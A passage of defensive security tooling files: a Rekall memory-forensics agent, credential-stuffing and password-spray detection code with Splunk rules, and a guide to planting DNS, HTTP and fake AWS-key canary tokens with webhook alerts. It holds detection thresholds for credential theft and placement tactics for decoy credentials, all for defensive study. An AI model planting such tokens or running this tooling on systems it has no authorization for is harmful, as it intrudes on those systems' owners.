            "https://github.com/google/rekall-profiles/raw/master"
        ]
    return session.Session(**kwargs)


def list_processes(s):
    """List all processes using pslist plugin."""
    processes = []
    for proc in s.plugins.pslist():
        processes.append({
            "pid": int(proc.pid),
            "ppid": int(proc.ppid),
            "name": str(proc.name),
            "create_time": str(getattr(proc, "create_time", "")),
        })
    return processes


def find_hidden_processes(s):
    """Detect hidden processes by comparing pslist vs psscan."""
    pslist_pids = {}
    for proc in s.plugins.pslist():
        pslist_pids[int(proc.pid)] = str(proc.name)
    psscan_pids = {}
    for proc in s.plugins.psscan():
        psscan_pids[int(proc.pid)] = str(proc.name)
    hidden = []
    for pid, name in psscan_pids.items():
        if pid not in pslist_pids and pid > 0:
            hidden.append({"pid": pid, "name": name, "detection": "psscan only"})
    return hidden


def detect_code_injection(s):
    """Detect injected code using malfind plugin (VAD analysis)."""
    injections = []
    for result in s.plugins.malfind():
        injections.append({
            "pid": int(getattr(result, "pid", 0)),
            "process": str(getattr(result, "name", "")),
            "address": hex(getattr(result, "address", 0)),
            "protection": str(getattr(result, "protection", "")),
            "tag": str(getattr(result, "tag", "")),
        })
    return injections


def list_network_connections(s):
    """List network connections using netscan plugin."""
    connections = []
    for conn in s.plugins.netscan():
        connections.append({
            "pid": int(getattr(conn, "pid", 0)),
            "local_addr": str(getattr(conn, "local_addr", "")),
            "remote_addr": str(getattr(conn, "remote_addr", "")),
            "state": str(getattr(conn, "state", "")),
            "protocol": str(getattr(conn, "protocol", "")),
        })
    return connections


def list_dlls(s, target_pid=None):
    """List loaded DLLs for processes using dlllist plugin."""
    dlls = []
    for entry in s.plugins.dlllist(pids=[target_pid] if target_pid else None):
        dlls.append({
            "pid": int(getattr(entry, "pid", 0)),
            "process": str(getattr(entry, "name", "")),
            "dll_path": str(getattr(entry, "path", "")),
            "base": hex(getattr(entry, "base", 0)),
            "size": int(getattr(entry, "size", 0)),
        })
    return dlls


def check_drivers(s):
    """List loaded kernel drivers using modules plugin."""
    drivers = []
    for mod in s.plugins.modules():
        drivers.append({
            "name": str(getattr(mod, "name", "")),
            "base": hex(getattr(mod, "base", 0)),
            "size": int(getattr(mod, "size", 0)),
        })
    return drivers


def analyze_vad(s, target_pid):
    """Analyze Virtual Address Descriptor tree for a process."""
    vad_entries = []
    for entry in s.plugins.vadinfo(pids=[target_pid]):
        vad_entries.append({
            "start": hex(getattr(entry, "start", 0)),
            "end": hex(getattr(entry, "end", 0)),
            "protection": str(getattr(entry, "protection", "")),
            "tag": str(getattr(entry, "tag", "")),
            "filename": str(getattr(entry, "filename", "")),
        })
    return vad_entries


def main():
    parser = argparse.ArgumentParser(description="Rekall Memory Forensics Agent")
    parser.add_argument("--image", required=True, help="Path to memory image")
    parser.add_argument("--profile-path", help="Path to Rekall profiles")
    parser.add_argument("--pid", type=int, help="Target PID for focused analysis")
    parser.add_argument("--output", default="rekall_report.json")
    parser.add_argument("--action", choices=[
        "pslist", "hidden", "malfind", "netscan", "dlls", "full_analysis"
    ], default="full_analysis")
    args = parser.parse_args()

    s = create_session(args.image, args.profile_path)
    report = {"image": args.image, "generated_at": datetime.utcnow().isoformat(),
              "findings": {}}

    if args.action in ("pslist", "full_analysis"):
        procs = list_processes(s)
        report["findings"]["processes"] = procs
        print(f"[+] Processes found: {len(procs)}")

    if args.action in ("hidden", "full_analysis"):
        hidden = find_hidden_processes(s)
        report["findings"]["hidden_processes"] = hidden
        print(f"[+] Hidden processes: {len(hidden)}")

    if args.action in ("malfind", "full_analysis"):
        injections = detect_code_injection(s)
        report["findings"]["code_injection"] = injections
        print(f"[+] Code injections detected: {len(injections)}")

    if args.action in ("netscan", "full_analysis"):
        conns = list_network_connections(s)
        report["findings"]["network_connections"] = conns
        print(f"[+] Network connections: {len(conns)}")

    if args.action in ("dlls", "full_analysis"):
        drivers = check_drivers(s)
        report["findings"]["kernel_drivers"] = drivers
        print(f"[+] Kernel drivers: {len(drivers)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/hunting-credential-stuffing-attacks/SKILL.md =====
---
name: hunting-credential-stuffing-attacks
description: 'Detects credential stuffing attacks by analyzing authentication logs
  for login velocity anomalies, ASN diversity, password spray patterns, and geographic
  distribution of failed logins. Uses statistical analysis on Splunk or raw log data.
  Use when investigating account takeover campaigns or building detection rules for
  auth abuse.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- credential-stuffing
- authentication-logs
- login-anomaly
- asn-analysis
- threat-hunting
- account-takeover
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1003
- T1110
mitre_f3:
  version: '1.1'
  tactics:
  - initial-access
  - positioning
  techniques:
  - id: T1110.004
    name: 'Brute Force:  Credential Stuffing'
    tactic: initial-access
    source: attack
  - id: T1110.003
    name: 'Brute Force: Password Spraying'
    tactic: initial-access
    source: attack
  - id: F1006.002
    name: 'Account Takeover: Exposed Login Credential'
    tactic: initial-access
    source: f3
  - id: F1006
    name: Account Takeover
    tactic: initial-access
    source: f3
---

# Hunting Credential Stuffing Attacks


## When to Use

- When investigating security incidents that require hunting credential stuffing attacks
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Familiarity with security operations concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Instructions

Analyze authentication logs to detect credential stuffing by identifying patterns
of distributed login failures, high IP diversity, and suspicious ASN distribution.

```python
import pandas as pd
from collections import Counter

# Load auth logs
df = pd.read_csv("auth_logs.csv", parse_dates=["timestamp"])

# Credential stuffing indicator: many IPs trying few accounts
ip_per_account = df[df["status"] == "failed"].groupby("username")["source_ip"].nunique()
accounts_under_attack = ip_per_account[ip_per_account > 50]
```

Key detection indicators:
1. High unique source IPs per failed username
2. Low success rate across many accounts (< 1%)
3. ASN concentration from cloud/proxy providers
4. Geographic impossibility (same account, distant locations)
5. User-agent uniformity across distributed IPs

## Examples

```python
# Password spray: one password tried across many accounts
spray = df[df["status"] == "failed"].groupby(["source_ip", "password_hash"]).agg(
    accounts=("username", "nunique")).reset_index()
sprays = spray[spray["accounts"] > 10]
```

===== END FILE =====


===== FILE: skills/hunting-credential-stuffing-attacks/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/hunting-credential-stuffing-attacks/references/api-reference.md =====
# API Reference: Hunting Credential Stuffing Attacks

## Pandas Authentication Log Analysis

```python
import pandas as pd

df = pd.read_csv("auth_logs.csv", parse_dates=["timestamp"])
# Columns: timestamp, username, source_ip, status, user_agent

# Failed logins per IP
df[df["status"] == "failed"].groupby("source_ip")["username"].nunique()

# Failed logins per account (distributed attack)
df[df["status"] == "failed"].groupby("username")["source_ip"].nunique()

# Login velocity (attempts per minute)
df.set_index("timestamp").resample("1min").count()
```

## Detection Thresholds

| Indicator | Threshold | Attack Type |
|-----------|-----------|-------------|
| Unique accounts per IP | > 20 | Credential stuffing |
| Unique IPs per account | > 5 | Distributed attack |
| Attempts/account ratio | ~1 | Password spray |
| Success after N failures | N > 5 | Account compromise |
| Single UA > 30% of failures | > 50 events | Automated tool |

## Splunk SPL Patterns

```spl
--- Credential stuffing detection
index=auth status=failed
| stats dc(username) as accounts, count by src_ip
| where accounts > 20

--- Password spray detection
index=auth status=failed
| stats dc(username) as accounts, count by src_ip
| where accounts > 10 AND count <= accounts * 3
```

### References

- OWASP Credential Stuffing: https://owasp.org/www-community/attacks/Credential_stuffing
- Splunk auth analysis: https://docs.splunk.com/Documentation/ES
- pandas: https://pandas.pydata.org/docs/

===== END FILE =====


===== FILE: skills/hunting-credential-stuffing-attacks/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for hunting credential stuffing attacks in authentication logs."""

import json
import argparse
from datetime import datetime

import pandas as pd


def load_auth_logs(log_path):
    """Load authentication logs from CSV or JSON lines."""
    if log_path.endswith(".csv"):
        return pd.read_csv(log_path, parse_dates=["timestamp"])
    elif log_path.endswith(".json") or log_path.endswith(".jsonl"):
        return pd.read_json(log_path, lines=True)
    else:
        return pd.read_csv(log_path, parse_dates=["timestamp"])


def detect_credential_stuffing(df, ip_threshold=20, time_window="1h"):
    """Detect credential stuffing by analyzing failed login patterns."""
    failed = df[df["status"] == "failed"].copy()
    if failed.empty:
        return []
    failed = failed.sort_values("timestamp")
    findings = []
    ip_account = failed.groupby("source_ip").agg(
        unique_accounts=("username", "nunique"),
        total_attempts=("username", "count"),
        first_seen=("timestamp", "min"),
        last_seen=("timestamp", "max"),
    ).reset_index()
    stuffing_ips = ip_account[ip_account["unique_accounts"] >= ip_threshold]
    for _, row in stuffing_ips.iterrows():
        duration = (row["last_seen"] - row["first_seen"]).total_seconds()
        findings.append({
            "source_ip": row["source_ip"],
            "unique_accounts_targeted": int(row["unique_accounts"]),
            "total_attempts": int(row["total_attempts"]),
            "duration_seconds": int(duration),
            "attempts_per_minute": round(row["total_attempts"] / max(duration / 60, 1), 1),
            "type": "credential_stuffing",
            "severity": "CRITICAL" if row["unique_accounts"] > 100 else "HIGH",
        })
    return sorted(findings, key=lambda x: x["unique_accounts_targeted"], reverse=True)


def detect_password_spray(df, account_threshold=10):
    """Detect password spray attacks (one password, many accounts)."""
    failed = df[df["status"] == "failed"].copy()
    if failed.empty:
        return []
    findings = []
    ip_groups = failed.groupby("source_ip").agg(
        unique_accounts=("username", "nunique"),
        total_attempts=("username", "count"),
    ).reset_index()
    spray_candidates = ip_groups[
        (ip_groups["unique_accounts"] >= account_threshold) &
        (ip_groups["total_attempts"] <= ip_groups["unique_accounts"] * 3)
    ]
    for _, row in spray_candidates.iterrows():
        ratio = row["total_attempts"] / row["unique_accounts"]
        findings.append({
            "source_ip": row["source_ip"],
            "unique_accounts": int(row["unique_accounts"]),
            "total_attempts": int(row["total_attempts"]),
            "attempts_per_account": round(ratio, 1),
            "type": "password_spray",
            "severity": "HIGH",
        })
    return findings


def detect_distributed_attack(df, account_ip_threshold=5):
    """Detect distributed credential stuffing (many IPs per account)."""
    failed = df[df["status"] == "failed"]
    if failed.empty:
        return []
    account_ips = failed.groupby("username").agg(
        unique_ips=("source_ip", "nunique"),
        total_failures=("source_ip", "count"),
    ).reset_index()
    distributed = account_ips[account_ips["unique_ips"] >= account_ip_threshold]
    findings = []
    for _, row in distributed.iterrows():
        findings.append({
            "username": row["username"],
            "unique_source_ips": int(row["unique_ips"]),
            "total_failures": int(row["total_failures"]),
            "type": "distributed_attack",
            "severity": "HIGH",
        })
    return sorted(findings, key=lambda x: x["unique_source_ips"], reverse=True)


def analyze_success_after_failures(df, min_failures=5):
    """Find accounts with successful login after many failures (compromised)."""
    compromised = []
    for username, group in df.groupby("username"):
        group = group.sort_values("timestamp")
        failures = 0
        for _, row in group.iterrows():
            if row["status"] == "failed":
                failures += 1
            elif row["status"] == "success" and failures >= min_failures:
                compromised.append({
                    "username": username,
                    "failures_before_success": failures,
                    "success_ip": row.get("source_ip", ""),
                    "success_time": str(row["timestamp"]),
                    "severity": "CRITICAL",
                })
                break
    return compromised


def analyze_user_agent_patterns(df):
    """Detect automation by analyzing user-agent distribution."""
    failed = df[df["status"] == "failed"]
    if "user_agent" not in failed.columns or failed.empty:
        return []
    ua_counts = failed["user_agent"].value_counts()
    total = len(failed)
    suspicious = []
    for ua, count in ua_counts.items():
        pct = count / total * 100
        if pct > 30 and count > 50:
            suspicious.append({
                "user_agent": str(ua)[:200],
                "count": int(count),
                "percentage": round(pct, 1),
                "likely_automated": True,
            })
    return suspicious


def calculate_attack_metrics(df):
    """Calculate overall authentication attack metrics."""
    total = len(df)
    failures = len(df[df["status"] == "failed"])
    successes = len(df[df["status"] == "success"])
    return {
        "total_events": total,
        "total_failures": failures,
        "total_successes": successes,
        "failure_rate": round(failures / max(total, 1) * 100, 1),
        "unique_ips": int(df["source_ip"].nunique()),
        "unique_accounts": int(df["username"].nunique()),
        "time_range": f"{df['timestamp'].min()} to {df['timestamp'].max()}",
    }


def main():
    parser = argparse.ArgumentParser(description="Credential Stuffing Detection Agent")
    parser.add_argument("--log-file", required=True, help="Authentication log file")
    parser.add_argument("--output", default="credential_stuffing_report.json")
    parser.add_argument("--action", choices=[
        "stuffing", "spray", "distributed", "compromised", "full_hunt"
    ], default="full_hunt")
    args = parser.parse_args()

    df = load_auth_logs(args.log_file)
    report = {"generated_at": datetime.utcnow().isoformat(),
              "metrics": calculate_attack_metrics(df), "findings": {}}
    print(f"[+] Loaded {len(df)} auth events")

    if args.action in ("stuffing", "full_hunt"):
        findings = detect_credential_stuffing(df)
        report["findings"]["credential_stuffing"] = findings
        print(f"[+] Credential stuffing IPs: {len(findings)}")

    if args.action in ("spray", "full_hunt"):
        findings = detect_password_spray(df)
        report["findings"]["password_spray"] = findings
        print(f"[+] Password spray IPs: {len(findings)}")

    if args.action in ("distributed", "full_hunt"):
        findings = detect_distributed_attack(df)
        report["findings"]["distributed_attacks"] = findings
        print(f"[+] Distributed attack targets: {len(findings)}")

    if args.action in ("compromised", "full_hunt"):
        findings = analyze_success_after_failures(df)
        report["findings"]["compromised_accounts"] = findings
        print(f"[+] Potentially compromised accounts: {len(findings)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-canary-tokens-for-network-intrusion/SKILL.md =====
---
name: implementing-canary-tokens-for-network-intrusion
description: 'Deploys DNS, HTTP, and AWS API key canary tokens across network infrastructure
  to detect unauthorized access and lateral movement. Integrates with webhook alerting
  (Slack, Teams, email, generic HTTP) for real-time intrusion notifications. Provides
  automated token generation, placement strategies, and monitoring for enterprise
  network environments. Use when building deception-based network intrusion detection
  with Canarytokens.org and Thinkst Canary platforms.

  '
domain: cybersecurity
subdomain: security-operations
tags:
- canary-tokens
- intrusion-detection
- deception
- network-security
- honeytokens
- breach-detection
version: '1.0'
author: mukul975
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1021
- T1550
---

# Implementing Canary Tokens for Network Intrusion Detection

## When to Use

- When deploying deception-based tripwires across network infrastructure to detect intrusions
- When building early warning systems that alert on unauthorized access to sensitive resources
- When planting fake AWS credentials, DNS beacons, or HTTP tokens to catch attackers during lateral movement
- When integrating canary token alerts with SOC workflows via Slack, Microsoft Teams, or SIEM webhooks
- When complementing traditional IDS/IPS with zero-false-positive deception technology

## Prerequisites

- Python 3.8+ with `requests` library installed
- Network access to canarytokens.org API (or self-hosted Canarytokens instance)
- Webhook endpoint for alert delivery (Slack, Teams, email, or generic HTTP)
- For Thinkst Canary enterprise: valid console domain and API auth token
- Administrative access to target systems where tokens will be planted
- Appropriate authorization for all deployment activities

## Core Concepts

### What Are Canary Tokens?

Canary tokens are digital tripwires -- resources that should never be accessed during normal
operations. When an attacker interacts with a canary token, it immediately triggers an alert
with near-zero false positives. Unlike signature-based detection, canary tokens detect
attackers by their behavior (accessing bait resources) rather than matching known patterns.

### Token Types for Network Intrusion Detection

| Token Type | Trigger Mechanism | Best Placement | Detection Scenario |
|------------|-------------------|----------------|-------------------|
| DNS Token | DNS resolution of FQDN | Config files, scripts, internal docs | Attacker reads configs during recon |
| HTTP Token | HTTP GET to unique URL | Internal wikis, bookmark files, HTML | Attacker browses internal resources |
| AWS API Key | AWS API call with fake creds | `.aws/credentials`, env files, repos | Attacker tests found credentials |
| Cloned Site | Visit to cloned page | Internal portals, admin panels | Attacker accesses cloned services |
| SVN Token | SVN checkout | Repository configs | Attacker clones repositories |
| SQL Server | Database login attempt | Connection strings, config files | Attacker attempts DB access |

### Alert Flow Architecture

```
[Attacker Action] --> [Token Triggered] --> [Canarytokens Server]
                                                    |
                                            [Webhook POST]
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    [Slack Alert]           [Email Alert]             [SIEM Ingestion]
                          |                         |                         |
                    [SOC Analyst]           [On-Call Page]           [Correlation Rule]
```

## Instructions

### Step 1: Generate DNS Canary Tokens

DNS tokens are the most versatile -- they trigger on any DNS resolution, even from
air-gapped networks with only DNS egress. The token is an FQDN that, when resolved,
alerts the token owner.

```python
import requests

# Create DNS canary token via Canarytokens.org
response = requests.post("https://canarytokens.org/generate", data={
    "type": "dns",
    "email": "soc@company.com",
    "memo": "Production database server - /etc/app/db.conf",
    "webhook_url": "https://hooks.slack.com/services/T.../B.../xxx"
}, timeout=15)

token_data = response.json()
dns_hostname = token_data["hostname"]
# Example: abc123def456.canarytokens.com
```

Plant DNS tokens in locations attackers commonly inspect:
- `/etc/hosts` entries pointing to the canary FQDN
- Application configuration files (`database_host`, `backup_server`)
- SSH config files (`~/.ssh/config`) with canary hostnames
- Internal DNS zone files as decoy A records
- CI/CD pipeline environment variables

### Step 2: Deploy HTTP Canary Tokens

HTTP tokens generate a unique URL that triggers on any HTTP request. They reveal the
source IP, User-Agent, and other HTTP headers of the requester.

```python
# Create HTTP token
response = requests.post("https://canarytokens.org/generate", data={
    "type": "http",
    "email": "soc@company.com",
    "memo": "Internal wiki - IT admin passwords page",
    "webhook_url": "https://hooks.slack.com/services/T.../B.../xxx"
}, timeout=15)

http_url = response.json()["url"]
# Embed in internal HTML pages, documents, or bookmark files
```

Placement strategies for HTTP tokens:
- Hidden `<img>` tags in internal wiki pages with sensitive titles
- URL shortener redirects in shared bookmark collections
- Links in internal documentation labeled "admin credentials" or "VPN configs"
- `.url` or `.webloc` shortcut files in network shares
- Browser bookmark exports in user profile backups

### Step 3: Create AWS API Key Tokens

AWS key tokens are among the highest-fidelity canary tokens. They generate real-looking
AWS access keys that trigger an alert whenever anyone attempts to use them against any
AWS API endpoint.

```python
# Create AWS API key canary token
response = requests.post("https://canarytokens.org/generate", data={
    "type": "aws_keys",
    "email": "soc@company.com",
    "memo": "DevOps jump box - /home/deploy/.aws/credentials",
    "webhook_url": "https://hooks.slack.com/services/T.../B.../xxx"
}, timeout=15)

aws_token = response.json()
access_key_id = aws_token["access_key_id"]
secret_access_key = aws_token["secret_access_key"]
```

Deploy the fake credentials:
```ini
# Place in ~/.aws/credentials on honeypot or jump servers
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1

# Also plant in:
# - .env files in code repositories
# - Docker environment configurations
# - Terraform state files (decoy)
# - Jenkins/CI credential stores
```

### Step 4: Configure Webhook Alert Integration

Set up real-time alerting to your SOC through multiple channels:

```python
# Slack webhook integration
def send_slack_alert(webhook_url, alert_data):
    """Forward canary token alert to Slack channel."""
    payload = {
        "text": f":rotating_light: *Canary Token Triggered*",
        "attachments": [{
            "color": "#FF0000",
            "fields": [
                {"title": "Token Memo", "value": alert_data.get("memo", "Unknown"), "short": True},
                {"title": "Source IP", "value": alert_data.get("src_ip", "Unknown"), "short": True},
                {"title": "Token Type", "value": alert_data.get("channel", "Unknown"), "short": True},
                {"title": "Triggered At", "value": alert_data.get("time", "Unknown"), "short": True},
            ],
            "footer": "Canarytokens Alert System",
        }]
    }
    requests.post(webhook_url, json=payload, timeout=10)
```

```python
# Generic webhook receiver (Flask) for SIEM ingestion
from flask import Flask, request, jsonify
import json, logging

app = Flask(__name__)
logging.basicConfig(filename="/var/log/canary_alerts.json", level=logging.INFO)

@app.route("/canary-webhook", methods=["POST"])
def receive_alert():
    alert = request.json or request.form.to_dict()
    logging.info(json.dumps({
        "event_type": "canarytoken_triggered",
        "memo": alert.get("memo"),
        "src_ip": alert.get("src_ip"),
        "token_type": alert.get("channel"),
        "time": alert.get("time"),
        "manage_url": alert.get("manage_url"),
        "additional_data": alert.get("additional_data", {}),
    }))
    return jsonify({"status": "received"}), 200
```

### Step 5: Enterprise Deployment with Thinkst Canary API

For organizations using Thinkst Canary, leverage the API for mass deployment and
centralized management:

```python
import canarytools

# Connect to Thinkst Canary console
console = canarytools.Console(
    domain="yourcompany",
    api_key="your_api_auth_token"
)

# Create tokens programmatically at scale
token_types = {
    "dns": "DNS beacon in config files",
    "aws-id": "AWS credentials on jump servers",
    "http": "Web bug in internal documentation",
    "doc-msword": "Word document in finance share",
    "slack-api": "Fake Slack bot token in source code",
}

for kind, memo in token_types.items():
    result = console.tokens.create(memo=memo, kind=kind)
    print(f"[+] Created {kind} token: {result}")

# Monitor for triggered alerts
alerts = console.tokens.alerts()
for alert in alerts:
    print(f"[ALERT] {alert.memo} triggered from {alert.src_ip}")
```

### Step 6: Token Placement Strategy by Network Zone

**DMZ / Public-Facing:**
- HTTP tokens in admin panel login pages (hidden image tag)
- DNS tokens in web server configuration files
- AWS keys in `.env` files on staging servers

**Internal Network / Corporate:**
- DNS tokens in Active Directory Group Policy scripts
- AWS keys in developer workstation backup directories
- HTTP tokens in internal SharePoint/Confluence pages titled "Emergency Credentials"
- Word document tokens in network shares (`\\fileserver\IT\passwords.docx`)

**Production / Data Center:**
- DNS tokens in database configuration files
- AWS keys in CI/CD environment variables
- SQL Server tokens in connection strings on application servers
- SVN/Git tokens in repository configuration files

**Cloud Infrastructure:**
- AWS key tokens in S3 bucket policies (decoy)
- DNS tokens in CloudFormation/Terraform templates
- HTTP tokens in Lambda function environment variables
- Cloned-site tokens mimicking cloud admin consoles

## Examples

### Full Deployment Script

```python
# Deploy a comprehensive canary token network
python scripts/agent.py --action full_deploy \
    --email soc@company.com \
    --webhook https://hooks.slack.com/services/T.../B.../xxx \
    --output deployment_report.json
```

### Monitor Triggered Tokens

```python
# Check for triggered alerts
python scripts/agent.py --action monitor \
    --console-domain yourcompany \
    --api-key YOUR_AUTH_TOKEN
```

### Generate Token Inventory

```python
# Create inventory of all deployed tokens
python scripts/agent.py --action inventory \
    --output token_inventory.json
```

## Validation Checklist

- [ ] DNS tokens resolve correctly and generate alerts within 60 seconds
- [ ] HTTP tokens return a valid response and log source IP
- [ ] AWS key tokens trigger alerts when used with `aws sts get-caller-identity`
- [ ] Webhook alerts arrive in Slack/Teams/SIEM within acceptable latency
- [ ] Token memo fields contain sufficient context for SOC triage
- [ ] Deployment locations are documented in token inventory
- [ ] Alert escalation procedures are defined and tested
- [ ] Tokens do not interfere with legitimate operations
- [ ] Self-hosted Canarytokens instance (if used) is hardened and monitored
- [ ] Token rotation schedule is established (quarterly recommended)

## References

- Canarytokens Documentation: https://docs.canarytokens.org/guide/
- Thinkst Canary Platform: https://canary.tools/
- Thinkst Canary API: https://docs.canary.tools/canarytokens/actions.html
- Canarytokens Open Source: https://github.com/thinkst/canarytokens
